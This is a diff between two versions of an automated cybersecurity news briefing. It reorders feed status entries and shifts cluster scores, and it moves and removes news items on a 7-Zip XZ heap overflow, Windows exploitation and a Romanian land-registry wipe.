@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-21T03:23:07.056160+00:00
+- Generated: 2026-07-21T06:35:11.892895+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 77
-- Total items in window: 339
-- Total clusters raw: 162
-- Total clusters in packet: 73
-- Dropped low score: 89
+- Total items in window: 338
+- Total clusters raw: 159
+- Total clusters in packet: 68
+- Dropped low score: 91
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -75,38 +75,43 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Microsoft Security Blog** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/feed/
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 5
+  - In window count: 0
 - **Unit 42** (threat_research_primary)
   - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 4
-- **Google Threat Analysis Group** (threat_research_primary)
-  - URL: https://blog.google/threat-analysis-group/rss/
-  - Status: parse_error
-  - Item count: 0
+- **Microsoft Security Blog** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 5
+- **Trend Micro Research** (threat_research_primary)
+  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
+  - Status: ok
+  - Item count: 25
   - In window count: 0
 - **Microsoft Threat Intelligence** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Trend Micro Research** (threat_research_primary)
-  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
-  - Status: ok
-  - Item count: 25
-  - In window count: 0
 - **Sekoia** (threat_research_primary)
   - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Check Point Research** (threat_research_primary)
+  - URL: https://research.checkpoint.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 1
+- **Google Threat Analysis Group** (threat_research_primary)
+  - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
@@ -125,16 +130,16 @@
   - Status: ok
   - Item count: 15
   - In window count: 6
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 3
-- **Check Point Research** (threat_research_primary)
-  - URL: https://research.checkpoint.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 1
 - **SANS Internet Storm Center** (government_authoritative)
   - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
@@ -150,25 +155,20 @@
   - Status: ok
   - Item count: 10
   - In window count: 7
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
+  - Status: ok
+  - Item count: 78
+  - In window count: 0
 - **Recorded Future** (threat_research_primary)
   - URL: https://www.recordedfuture.com/feed
   - Status: ok
   - Item count: 50
   - In window count: 4
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 0
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
-  - Status: ok
-  - Item count: 78
   - In window count: 0
 - **Red Canary** (detection_response_operations)
   - URL: https://redcanary.com/feed/
@@ -199,7 +199,7 @@
   - URL: https://www.trustedsec.com/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 2
+  - In window count: 1
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
@@ -225,35 +225,30 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
-  - Status: ok
-  - Item count: 30
-  - In window count: 0
-- **Orca Security Research** (cloud_identity_infrastructure)
-  - URL: https://orca.security/resources/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 5
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 0
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
+  - In window count: 0
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 5
+- **Orca Security Research** (cloud_identity_infrastructure)
+  - URL: https://orca.security/resources/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **Huntress** (detection_response_operations)
   - URL: https://www.huntress.com/blog/rss.xml
   - Status: ok
   - Item count: 100
-  - In window count: 0
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
-  - Status: ok
-  - Item count: 10
   - In window count: 0
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
@@ -265,26 +260,36 @@
   - Status: ok
   - Item count: 20
   - In window count: 2
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: ok
   - Item count: 10
-  - In window count: 0
-- **Cloudflare Security** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/security/rss/
-  - Status: ok
-  - Item count: 20
   - In window count: 0
 - **Sysdig** (detection_response_operations)
   - URL: https://sysdig.com/feed/
   - Status: ok
   - Item count: 100
   - In window count: 2
+- **Cloudflare Security** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/security/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 0
 - **Wiz Research** (cloud_identity_infrastructure)
   - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 3
+- **Google DeepMind Blog** (ai_security_agentic_risk)
+  - URL: https://deepmind.google/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Coveware** (ransomware_ecrime_financial_crime)
   - URL: https://www.coveware.com/blog?format=rss
   - Status: parse_error
@@ -295,11 +300,11 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Google DeepMind Blog** (ai_security_agentic_risk)
-  - URL: https://deepmind.google/blog/rss.xml
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
-  - Item count: 100
-  - In window count: 1
+  - Item count: 10
+  - In window count: 3
 - **OpenSSF Blog** (ai_security_agentic_risk)
   - URL: https://openssf.org/feed/
   - Status: ok
@@ -310,11 +315,6 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 3
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
@@ -330,18 +330,18 @@
   - Status: ok
   - Item count: 15
   - In window count: 15
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - URL: https://www.securityweek.com/feed/
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
   - Status: ok
-  - Item count: 10
-  - In window count: 10
+  - Item count: 30
+  - In window count: 25
 - **GreyNoise** (cloud_identity_infrastructure)
   - URL: https://www.greynoise.io/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - URL: https://www.securityweek.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -350,51 +350,46 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
   - Status: ok
-  - Item count: 30
-  - In window count: 25
-- **Dark Reading** (cyber_news_breach_reporting)
-  - URL: https://www.darkreading.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 26
+  - Item count: 10
+  - In window count: 10
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Schneier on Security** (practitioner_analysis)
-  - URL: https://www.schneier.com/feed/atom/
+- **Dark Reading** (cyber_news_breach_reporting)
+  - URL: https://www.darkreading.com/rss.xml
   - Status: ok
-  - Item count: 10
-  - In window count: 7
+  - Item count: 50
+  - In window count: 26
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 0
+- **Schneier on Security** (practitioner_analysis)
+  - URL: https://www.schneier.com/feed/atom/
+  - Status: ok
+  - Item count: 10
+  - In window count: 7
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
   - Item count: 15
-  - In window count: 1
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: ok
-  - Item count: 100
   - In window count: 1
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Reddit r/blueteamsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/blueteamsec/.rss
   - Status: ok
@@ -420,41 +415,46 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
   - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
-  - Status: ok
-  - Item count: 100
-  - In window count: 4
+  - Item count: 10
+  - In window count: 1
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
   - Item count: 100
   - In window count: 25
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
+  - Status: ok
+  - Item count: 100
+  - In window count: 4
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
   - Item count: 25
   - In window count: 18
-- **tl;dr sec** (practitioner_analysis)
-  - URL: https://tldrsec.com/feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Embrace the Red** (ai_security_agentic_risk)
   - URL: https://embracethered.com/blog/index.xml
   - Status: ok
   - Item count: 100
   - In window count: 2
+- **tl;dr sec** (practitioner_analysis)
+  - URL: https://tldrsec.com/feed.xml
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **Risky Business News** (practitioner_analysis)
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
@@ -664,25 +664,6 @@
   - https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
   - https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
 
-### Microsoft Windows active exploitation
-- Anchor signal: Microsoft Windows
-- Theme key: microsoft-windows
-- Cluster count: 3
-- Article count: 3
-- Cohesion: 0.235
-- Shared strong signals: Microsoft Windows
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation
-  - affected_products: Microsoft Windows
-  - urgency_signals: actively_exploited
-- Cluster IDs: 05695d371f, 8f654ac030, cf7aa5bc3e
-- Links:
-  - https://www.helpnetsecurity.com/2026/07/20/windows-10-support-risks-report/
-  - https://blog.talosintelligence.com/microsoft-patch-tuesday-july-2026/
-  - https://www.welivesecurity.com/en/eset-research/forgotten-uefi-shims-undermining-secure-boot/
-
 ### supply chain targeting npm
 - Anchor signal: npm
 - Theme key: npm
@@ -739,6 +720,22 @@
   - https://aws.amazon.com/blogs/security/introducing-the-amazon-guardduty-investigation-agent-on-demand-ai-powered-threat-assessment/
   - https://thehackernews.com/2026/07/new-nadmesh-botnet-hunts-exposed-ai.html
   - https://thehackernews.com/2026/07/unpatched-shark-vacuum-flaw-could-let.html
+
+### Palo Alto Networks vulnerability activity
+- Anchor signal: Palo Alto Networks
+- Theme key: palo-alto-networks
+- Cluster count: 2
+- Article count: 2
+- Cohesion: 0.273
+- Shared strong signals: Palo Alto Networks
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - affected_products: Palo Alto Networks
+- Cluster IDs: d9c1f05e41, 72fdd19b2c
+- Links:
+  - https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/
+  - https://unit42.paloaltonetworks.com/ai-insights-incident-response-report/
 
 ## Forward signals
 
@@ -977,7 +974,7 @@ Back to Blog Vulnerabilities and Exploits CVE-2026-58644: Microsoft SharePoint S
   - Link: https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
   - Summary: From late April 2026 to mid-June 2026, Microsoft Defender Experts observed increased ACR Stealer activity across customer environments. These campaigns are successfully using ClickFix lures to steal browser credentials, authentication tokens, and sensitive documents from enterprise environments. The post ACR Stealer: Two observed intrusion chains amid increased threat activity appeared first on Microsoft Security Blog .
 
-### Cluster d0a6ea7ea5 — score 52
+### Cluster d0a6ea7ea5 — score 51
 
 - Title: Exploitation in the Wild of wp2shell
 - Source: Wiz Research (cloud_identity_infrastructure)
@@ -1184,7 +1181,7 @@ Threat Research Center High Profile Threats Malware Malware The npm Threat Lands
   - Link: https://thehackernews.com/2026/07/compromised-asyncapi-npm-packages.html
   - Summary: Four compromised npm packages in the @asyncapi namespace have been observed distributing a multi-stage botnet loader, according to findings from OX Security, SafeDep, Socket, and StepSecurity. The affected packages are listed below - @asyncapi/generator-helpers@1.1.1 @asyncapi/generator-components@0.7.1 @asyncapi/generator@3.3.1 @asyncapi/specs(v6.11.2, v6.11.2-alpha.1) "The
 
-### Cluster 9e0819b3d1 — score 23
+### Cluster 9e0819b3d1 — score 22
 
 - Title: Critical Heap Buffer Overflow in NGINX Allows Unauthenticated Remote Code Execution
 - Source: Orca Security Research (cloud_identity_infrastructure)
@@ -1236,7 +1233,7 @@ A critical vulnerability ( CVE-2026-42533 , CVSS v4.0 9.2 / CVSS v3.1 8.1) was d
   - Link: https://thehackernews.com/2026/07/critical-nginx-vulnerability-can-crash.html
   - Summary: F5 has shipped fixes for a critical nginx flaw that lets a remote, unauthenticated attacker trigger a heap buffer overflow in the worker process with crafted HTTP requests. CVE-2026-42533 was patched on July 15 in nginx 1.30.4 (stable) and 1.31.3 (mainline), and in NGINX Plus 37.0.3.1; anyone on an earlier build should upgrade. Triggering it can crash or restart the worker, causing a denial of
 
-### Cluster 06406030dc — score 22
+### Cluster 06406030dc — score 21
 
 - Title: Critical Ubuntu Pro Client Vulnerability Enables Root Code Execution Across Cloud Workloads
 - Source: Orca Security Research (cloud_identity_infrastructure)
@@ -1606,55 +1603,6 @@ Simon Willison’s Weblog Subscribe Sponsored by: Atlassian — Give your agents
   - Link: https://horizon3.ai/news/press-release/horizon3-ai-joins-anthropics-project-glasswing/
   - Summary: Horizon3.ai announces its participation in Anthropic's Project Glasswing, an initiative focused on securing the world’s most critical infrastructure.
 
-### Cluster 629e6024b5 — score 15
-
-- Title: New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-20T09:10:56+00:00
-- Link: https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: CVE-2026-14266
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, phishing_social_eng, zero_day
-- actor_attribution: ShinyHunters
-- affected_products: Microsoft 365, Microsoft Entra, Salesforce
-- cve_ids: CVE-2026-14266, CVE-2026-48095
-- urgency_signals: actively_exploited, zero_day
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: phishing_social_eng, zero_day, active_exploitation
-- actor_attribution: ShinyHunters
-- affected_products: Salesforce, Microsoft Entra, Microsoft 365
-- cve_ids: CVE-2026-14266, CVE-2026-48095
-- urgency_signals: actively_exploited, zero_day
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker "execute code in the context of the current process," per the
-```
-
-#### Full body
-
-```
-New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction  Swati Khandelwal  Jul 20, 2026 Vulnerability / Endpoint Security Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266 , is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02 . The overflow lets an attacker "execute code in the context of the current process," per the advisory. The code runs with the token 7-Zip itself holds and gains no privileges of its own. On Windows, a normally launched 7-Zip runs under a filtered standard-user token even on an administrator account, so the attacker inherits those limited rights unless the program was started elevated. The bug came in from Landon Peng of Lunbun LLC, who reported it to 7-Zip on June 5. ZDI rates the flaw 7.0, or High, not the Critical several write-ups reached for. The full CVSS 3.0 vector is AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H . The AV:L makes it a local attack vector, not a network-reachable or no-click one. ZDI's "remote code execution" describes a remote attacker delivering the file, which the victim still has to open, whether it arrives by email, a download, or a web page that hands it to 7-Zip. The high attack complexity makes reliable exploitation harder still. As of July 20, 2026, The Hacker News found no public proof-of-concept for the bug and no credible report of exploitation in the wild. The Hacker News compared the XZ decoder source across releases. The fix lands in one function, MixCoder_Code in C/XzDec.c . When an XZ stream runs its output through a filter, the decoder was handed the full output-buffer length on each pass instead of the space left after earlier writes. That gave it more room to work with than the buffer held, the out-of-bounds write condition ZDI describes. Version 26.02 subtracts the bytes already written and bails out if that running total ever exceeds the buffer. The same flawed length handling appears unchanged in 7-Zip source back to at least version 21.07 (2021), though neither ZDI nor 7-Zip has said which releases are actually exploitable. CVE-2026-14266 is the latest in a run of memory-safety bugs in 7-Zip's archive handlers. On April 27, version 26.01 fixed a batch of them , including the higher-scored CVE-2026-48095 , an NTFS-handler heap-write overflow that GitHub Security Lab detailed on May 22 with a working proof-of-concept. The XZ flaw is the quieter of the two so far, and 26.02 rolls up every one of these fixes, so one update covers them all. So update to 7-Zip 26.02 or later on every machine that opens archives from outside. Updating is a manual install from the official site, so set-and-forget machines will not pick it up on their own. Any product that ships a vulnerable copy of 7-Zip's XZ decoder needs its own vendor fix. The patch went out 20 days before the advisory, so anyone who updated in late June was covered before the details were public. For once, updating gets you ahead of the problem instead of chasing it. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Code Execution , endpoint security , Patch Management , Software Security , Vulnerability , Windows ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Micr
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction
-  - Published: 2026-07-20T09:10:56+00:00
-  - Link: https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
-  - Summary: Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker "execute code in the context of the current process," per the
-
 ### Cluster 3d70163861 — score 15
 
 - Title: CISA Mandates Urgent Patch for Actively Exploited Critical Fortinet Vulnerabilities
@@ -1703,6 +1651,55 @@ Infosecurity Magazine Home » News » CISA Mandates Urgent Patch for Actively Ex
   - Published: 2026-07-17T09:45:00+00:00
   - Link: https://www.infosecurity-magazine.com/news/cisa-urgent-patch-fortinet/
   - Summary: US government agencies have until July 19 to patch two critical Fortinet vulnerabilities
+
+### Cluster 629e6024b5 — score 15
+
+- Title: New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-20T09:10:56+00:00
+- Link: https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-14266
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, phishing_social_eng, zero_day
+- actor_attribution: ShinyHunters
+- affected_products: Microsoft 365, Microsoft Entra, Salesforce
+- cve_ids: CVE-2026-14266, CVE-2026-48095
+- urgency_signals: actively_exploited, zero_day
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: phishing_social_eng, zero_day, active_exploitation
+- actor_attribution: ShinyHunters
+- affected_products: Salesforce, Microsoft Entra, Microsoft 365
+- cve_ids: CVE-2026-14266, CVE-2026-48095
+- urgency_signals: actively_exploited, zero_day
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker "execute code in the context of the current process," per the
+```
+
+#### Full body
+
+```
+New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction  Swati Khandelwal  Jul 20, 2026 Vulnerability / Endpoint Security Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266 , is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02 . The overflow lets an attacker "execute code in the context of the current process," per the advisory. The code runs with the token 7-Zip itself holds and gains no privileges of its own. On Windows, a normally launched 7-Zip runs under a filtered standard-user token even on an administrator account, so the attacker inherits those limited rights unless the program was started elevated. The bug came in from Landon Peng of Lunbun LLC, who reported it to 7-Zip on June 5. ZDI rates the flaw 7.0, or High, not the Critical several write-ups reached for. The full CVSS 3.0 vector is AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H . The AV:L makes it a local attack vector, not a network-reachable or no-click one. ZDI's "remote code execution" describes a remote attacker delivering the file, which the victim still has to open, whether it arrives by email, a download, or a web page that hands it to 7-Zip. The high attack complexity makes reliable exploitation harder still. As of July 20, 2026, The Hacker News found no public proof-of-concept for the bug and no credible report of exploitation in the wild. The Hacker News compared the XZ decoder source across releases. The fix lands in one function, MixCoder_Code in C/XzDec.c . When an XZ stream runs its output through a filter, the decoder was handed the full output-buffer length on each pass instead of the space left after earlier writes. That gave it more room to work with than the buffer held, the out-of-bounds write condition ZDI describes. Version 26.02 subtracts the bytes already written and bails out if that running total ever exceeds the buffer. The same flawed length handling appears unchanged in 7-Zip source back to at least version 21.07 (2021), though neither ZDI nor 7-Zip has said which releases are actually exploitable. CVE-2026-14266 is the latest in a run of memory-safety bugs in 7-Zip's archive handlers. On April 27, version 26.01 fixed a batch of them , including the higher-scored CVE-2026-48095 , an NTFS-handler heap-write overflow that GitHub Security Lab detailed on May 22 with a working proof-of-concept. The XZ flaw is the quieter of the two so far, and 26.02 rolls up every one of these fixes, so one update covers them all. So update to 7-Zip 26.02 or later on every machine that opens archives from outside. Updating is a manual install from the official site, so set-and-forget machines will not pick it up on their own. Any product that ships a vulnerable copy of 7-Zip's XZ decoder needs its own vendor fix. The patch went out 20 days before the advisory, so anyone who updated in late June was covered before the details were public. For once, updating gets you ahead of the problem instead of chasing it. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Code Execution , endpoint security , Patch Management , Software Security , Vulnerability , Windows ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Micr
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction
+  - Published: 2026-07-20T09:10:56+00:00
+  - Link: https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
+  - Summary: Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker "execute code in the context of the current process," per the
 
 ### Cluster 947df114ac — score 13
 
@@ -1791,47 +1788,6 @@ Table of contents Key Takeaways What Is a Software Bill of Materials (SBOM)? BOM
   - Published: 2026-07-15T22:50:09+00:00
   - Link: https://orca.security/resources/blog/sbom-cloud-supply-chain-security/
   - Summary: Key Takeaways The World Economic Forum’s Global Cybersecurity Outlook 2026 found that 65% of large companies identify third-party and supply chain vulnerabilities as their greatest barrier to cyber resilience. You cannot defend software when you cannot see what it is built from, and modern applications are built almost entirely from components someone else wrote. A […]
-
-### Cluster 8013169017 — score 12
-
-- Title: Risky Bulletin: Hacker wipes Romania's entire land registry database
-- Source: Risky Business News (practitioner_analysis)
-- Published: 2026-07-20T05:22:45+00:00
-- Link: https://risky.biz/RBNEWS589/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Primary article taxonomy
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Summary
-
-```
-A hacker wipes Romania’s entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress.
-```
-
-#### Full body
-
-```
-Risky Bulletin Podcast July 20, 2026 Risky Bulletin: Hacker wipes Romania's entire land registry database Presented by Catalin Cimpanu News Editor Claire Aird Newsreader A hacker wipes Romaniaâs entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress. Your browser does not support the audio element. Risky Bulletin: Hacker wipes Romania's entire land registry database â¶ 0:00 / 9:03 Subscribe Brought to you by Thinkst Know. When it Matters! Show notes Risky Bulletin: Hacker wipes Romania's entire land registry database
-```
-
-#### Corroborating sources (1)
